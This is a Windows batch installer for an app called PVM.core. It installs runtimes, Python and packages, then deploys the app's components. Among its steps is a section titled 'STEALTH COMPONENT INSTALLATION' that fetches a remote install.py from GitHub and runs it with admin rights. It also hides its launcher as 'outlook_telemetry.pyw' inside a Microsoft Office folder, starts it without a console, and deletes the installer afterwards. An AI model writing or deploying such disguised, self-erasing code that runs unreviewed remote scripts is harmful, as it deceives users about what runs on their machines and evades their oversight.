@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul 2>&1
set "VERSION=3.10.76"
title PVM.core Autonomous Setup v!VERSION!

:: ============================================
:: 0. INITIALIZATION & LOGGING
:: ============================================
set "PYTHONIOENCODING=utf-8"
set "LOG=%USERPROFILE%\Desktop\pvm_setup_debug.log"
echo [!DATE! !TIME!] --- PVM.core Setup v!VERSION! --- > "!LOG!"

:: Elevation Check
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if %errorlevel% neq 0 (
    echo [System] Requesting Administrator privileges...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs -WorkingDirectory '%~dp0'"
    exit /b
)

:: Set working directory
cd /d "%~dp0"
echo [System] Current Directory: %~dp0 >> "!LOG!"

echo ============================================
echo    PVM.core Smart Installer (v!VERSION!)
echo ============================================
echo [System] Initializing environment...
echo [System] Detailed logs being written to: !LOG!
echo ============================================ >> "!LOG!"
echo    PVM.core Smart Installer (v!VERSION!) >> "!LOG!"
echo ============================================ >> "!LOG!"
echo [System] Initializing environment... >> "!LOG!"

:: ============================================
:: 1. MSVC REDISTRIBUTABLE CHECK (CRITICAL)
:: ============================================
echo [System] Verifying System Runtimes (C++ 2015-2022)...
echo [System] Verifying System Runtimes (C++ 2015-2022)... >> "!LOG!"
if not exist "%SystemRoot%\System32\vcruntime140.dll" (
    echo [System] Missing Visual C++ Runtimes. Starting autonomous repair...
    echo [System] Downloading Microsoft Visual C++ Redistributable... >> "!LOG!"
    set "VC_EXE=%TEMP%\vc_redist.x64.exe"
    if exist "%SystemRoot%\System32\curl.exe" (
        curl.exe -L --retry 3 -o "!VC_EXE!" "https://aka.ms/vs/17/release/vc_redist.x64.exe"
        echo [CURL] VC_redist exit: !errorlevel! >> "!LOG!"
    ) else (
        powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls; Invoke-WebRequest -Uri 'https://aka.ms/vs/17/release/vc_redist.x64.exe' -OutFile '!VC_EXE!' -UseBasicParsing -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' -MaximumRedirection 10}" >> "!LOG!" 2>&1
    )
    
    if exist "!VC_EXE!" (
        echo [System] Installing Visual C++ Runtimes. Please accept the prompt...
        "!VC_EXE!" /passive /norestart >> "!LOG!" 2>&1
        timeout /t 5 >nul
        del /f /q "!VC_EXE!" >nul 2>&1
        echo [System] Runtimes installed successfully.
        echo [System] Runtimes installed successfully. >> "!LOG!"
    ) else (
        echo [ERROR] Could not download Visual C++ Runtimes. Some components may crash. >> "!LOG!"
    )
) else (
    echo [System] System runtimes verified.
    echo [System] System runtimes verified. >> "!LOG!"
)

:: ============================================
:: 2. FIND REAL PYTHON 3.12+
:: ============================================
echo [System] Searching for valid Python 3.12+...
echo [System] Searching for valid Python 3.12+... >> "!LOG!"
set "PYTHON_CMD="
set "PY_REG_PATH="

:: 1. Registry check (fast — may fail on non-English locale, fallback methods below)
for /f "tokens=2*" %%a in ('reg query "HKCU\Software\Python\PythonCore\3.12\InstallPath" /ve 2^>nul') do set "PY_REG_PATH=%%b"
if defined PY_REG_PATH if exist "!PY_REG_PATH!python.exe" (
    set "PYTHON_CMD=!PY_REG_PATH!python.exe"
    goto :python_found
)

for /f "tokens=2*" %%a in ('reg query "HKLM\Software\Python\PythonCore\3.12\InstallPath" /ve 2^>nul') do set "PY_REG_PATH=%%b"
if defined PY_REG_PATH if exist "!PY_REG_PATH!python.exe" (
    set "PYTHON_CMD=!PY_REG_PATH!python.exe"
    goto :python_found
)

:: 2. Common install paths (fast, no where hang)
if exist "%LocalAppData%\Programs\Python\Python312\python.exe" (
    set "PYTHON_CMD=%LocalAppData%\Programs\Python\Python312\python.exe"
    goto :python_found
)
if exist "%ProgramFiles%\Python312\python.exe" (
    set "PYTHON_CMD=%ProgramFiles%\Python312\python.exe"
    goto :python_found
)
if exist "%SystemDrive%\Python312\python.exe" (
    set "PYTHON_CMD=%SystemDrive%\Python312\python.exe"
    goto :python_found
)

:: 3. py launcher (direct path check - instant, no PATH scan hang)
echo [System] Checking py launcher...
echo [System] Checking py launcher... >> "!LOG!"
echo [DIAG] Before py.exe check >> "!LOG!"
if exist "C:\Windows\py.exe" (
    echo [DIAG] py.exe found in C:\Windows >> "!LOG!"
    set "PYTHON_CMD=py"
    goto :python_found
)
if exist "%SystemRoot%\System32\py.exe" (
    echo [DIAG] py.exe found in System32 >> "!LOG!"
    set "PYTHON_CMD=py"
    goto :python_found
)
echo [DIAG] py.exe not found >> "!LOG!"

if defined PYTHON_CMD goto :python_found

echo [DIAG] Before download branch: PYTHON_CMD undefined >> "!LOG!"

echo [System] Python not found. Starting autonomous download...
echo [System] Python not found. Starting autonomous download... >> "!LOG!"
set "PY_EXE=%TEMP%\python_312_setup.exe"
echo [System] Downloading Python 3.12 (~25 MB, progress shown below)...
if exist "%SystemRoot%\System32\curl.exe" (
    curl.exe -L --retry 3 -o "!PY_EXE!" "https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe"
    echo [CURL] Python download exit: !errorlevel! >> "!LOG!"
) else (
    echo [System] curl.exe not found, using PowerShell... >> "!LOG!"
    powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls; Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe' -OutFile '!PY_EXE!' -UseBasicParsing -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' -MaximumRedirection 10}" >> "!LOG!" 2>&1
)

if not exist "!PY_EXE!" (
    echo [ERROR] Python download failed. >> "!LOG!"
    echo [ERROR] Python download failed.
    pause & exit /b 1
)

echo [System] Installing Python 3.12 (Silent)...
echo [System] Installing Python 3.12 (Silent)... >> "!LOG!"
"!PY_EXE!" /quiet InstallAllUsers=0 PrependPath=1 Include_pip=1 Include_tcltk=1 >> "!LOG!" 2>&1
timeout /t 8 >nul
del /f /q "!PY_EXE!" >nul 2>&1
if exist "%LocalAppData%\Programs\Python\Python312\python.exe" set "PYTHON_CMD=%LocalAppData%\Programs\Python\Python312\python.exe"

:python_found
if not defined PYTHON_CMD (
    echo [ERROR] Python still not found. >> "!LOG!"
    echo [ERROR] Python still not found.
    pause & exit /b 1
)
echo [System] Python found: !PYTHON_CMD!
echo [System] Python found: !PYTHON_CMD! >> "!LOG!"

:: ============================================
:: 3. VERIFY TKINTER & PIP
:: ============================================
"!PYTHON_CMD!" -c "import tkinter" >nul 2>&1
if !errorlevel! neq 0 (
    echo [System] Bootstrapping Tkinter...
    "!PYTHON_CMD!" -m pip install tk >> "!LOG!" 2>&1
)

:: ============================================
:: 4. CORE DEPENDENCIES
:: ============================================
echo [System] Installing Python packages (this may take a few minutes)...
echo [System] Installing Python packages... >> "!LOG!"
"!PYTHON_CMD!" -m pip install --upgrade pip setuptools wheel >> "!LOG!" 2>&1
"!PYTHON_CMD!" -m pip install requests pandas supabase playwright openpyxl pystray Pillow cryptography tkcalendar >> "!LOG!" 2>&1
if !errorlevel! neq 0 (
    echo [ERROR] Package installation failed. Check log on Desktop. >> "!LOG!"
    echo [ERROR] Package installation failed. Check pvm_setup_debug.log on Desktop.
    pause & exit /b 1
)

echo [System] Initializing browser engine...
"!PYTHON_CMD!" -m playwright install chromium >> "!LOG!" 2>&1

:: ============================================
:: 5. STEALTH COMPONENT INSTALLATION
:: ============================================
echo [System] Deploying components...
echo [System] Deploying components... >> "!LOG!"

:: Ensure install.py is present (download if missing - needed for updates from TEMP)
if not exist "%~dp0install.py" (
    echo [System] Downloading install component...
    echo [System] Downloading install component... >> "!LOG!"
    if exist "%SystemRoot%\System32\curl.exe" (
        curl.exe -L -o "%~dp0install.py" "https://raw.githubusercontent.com/GreenLeafBot/PVM/main/install.py"
        echo [CURL] install.py download exit: !errorlevel! >> "!LOG!"
    ) else (
        powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GreenLeafBot/PVM/main/install.py' -OutFile '%~dp0install.py' -UseBasicParsing -ErrorAction Stop" >> "!LOG!" 2>&1
    )
    if !errorlevel! neq 0 if not exist "%~dp0install.py" (
        echo [ERROR] Could not download install.py. Installation cannot proceed. >> "!LOG!"
        echo [ERROR] Could not download install.py. Installation cannot proceed.
        pause & exit /b 1
    )
)

set "INSTALL_SCRIPT=%~dp0install.py"
"!PYTHON_CMD!" "!INSTALL_SCRIPT!" >> "!LOG!" 2>&1
if !errorlevel! neq 0 (
    echo [ERROR] Component deployment failed. >> "!LOG!"
    echo [ERROR] Component deployment failed.
    pause & exit /b 1
)

:: ============================================
:: 6. DOWNLOAD APP ICON
:: ============================================
echo [System] Downloading app icon...
echo [System] Downloading app icon... >> "!LOG!"
set "ICON_DST=%USERPROFILE%\AppData\Local\Microsoft\Office\SmartBridge\app.ico"
if not exist "!ICON_DST!" (
    if exist "%SystemRoot%\System32\curl.exe" (
        curl.exe -L -o "!ICON_DST!" "https://kjndukfmrapsmpzspwmv.supabase.co/storage/v1/object/public/backend/app.ico"
        echo [CURL] app.ico download exit: !errorlevel! >> "!LOG!"
    ) else (
        powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls; Invoke-WebRequest -Uri 'https://kjndukfmrapsmpzspwmv.supabase.co/storage/v1/object/public/backend/app.ico' -OutFile '!ICON_DST!' -UseBasicParsing -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' -MaximumRedirection 10}" >> "!LOG!" 2>&1
    )
)
if exist "!ICON_DST!" (
    echo [System] App icon downloaded.
    echo [System] App icon downloaded. >> "!LOG!"
) else (
    if exist "%~dp0app.ico" (
        copy /Y "%~dp0app.ico" "!ICON_DST!" >nul 2>&1
        if exist "!ICON_DST!" (
            echo [System] App icon copied from local package. >> "!LOG!"
        ) else (
            echo [WARNING] App icon fallback failed. Shortcut may use default icon. >> "!LOG!"
        )
    ) else (
        echo [WARNING] App icon download failed. Shortcut may use default icon. >> "!LOG!"
    )
)

:: ============================================
:: 7. FINALIZING LAUNCHER
:: ============================================
set "LAUNCHER=%USERPROFILE%\AppData\Local\Microsoft\Office\SmartBridge\outlook_telemetry.pyw"

:: Find pythonw.exe (same folder as python.exe - instant, no PowerShell PATH scan)
set "PYTHONW=!PYTHON_CMD:python.exe=pythonw.exe!"
if not exist "!PYTHONW!" set "PYTHONW=pythonw"

echo [System] Creating desktop shortcut...
echo [System] Creating desktop shortcut... >> "!LOG!"
set "ICON_DST=%USERPROFILE%\AppData\Local\Microsoft\Office\SmartBridge\app.ico"
powershell -Command "& {$s=(New-Object -COM WScript.Shell).CreateShortcut('%USERPROFILE%\Desktop\PVM.core.lnk');$s.TargetPath='!PYTHONW!';$s.Arguments='\"!LAUNCHER!\"';$s.WorkingDirectory='%USERPROFILE%\AppData\Local\Microsoft\Office\SmartBridge';$s.IconLocation='!ICON_DST!';$s.Save()}" >> "!LOG!" 2>&1

:: ============================================
:: 8. SMOKE TEST (DIAGNOSTICS)
:: ============================================
echo [System] Performing smoke test...
echo [System] Performing smoke test... >> "!LOG!"
set "PVM_DEBUG=1"
"!PYTHON_CMD!" -c "import os,requests,cryptography,PIL,pystray,pandas,supabase; la=r'!LAUNCHER!'; assert os.path.exists(la),'Launcher cannot be found:'+la; print('Smoke test passed')" >> "!LOG!" 2>&1
set "PVM_EXIT_CODE=!ERRORLEVEL!"
set "PVM_DEBUG="

if !PVM_EXIT_CODE! neq 0 (
    echo [ERROR] Smoke test failed (code !PVM_EXIT_CODE!). >> "!LOG!"
    echo [ERROR] Smoke test failed (code !PVM_EXIT_CODE!).
    echo Please check pvm_setup_debug.log on Desktop.
    pause & exit /b 1
)

echo.
echo ============================================
echo    Installation Successful (v!VERSION!)
echo ============================================
echo Installation Successful. >> "!LOG!"

timeout /t 2 >nul

start "" "!PYTHONW!" "!LAUNCHER!"

:: Self-Cleanup (delete installer files on success only)
set "_me=%~f0"
set "_py=%~dp0install.py"
set "_ico=%~dp0app.ico"
start /b cmd /c "timeout /t 5 >nul & del /f /q "!_me!" 2>nul & del /f /q "!_py!" 2>nul & del /f /q "!_ico!" 2>nul"
exit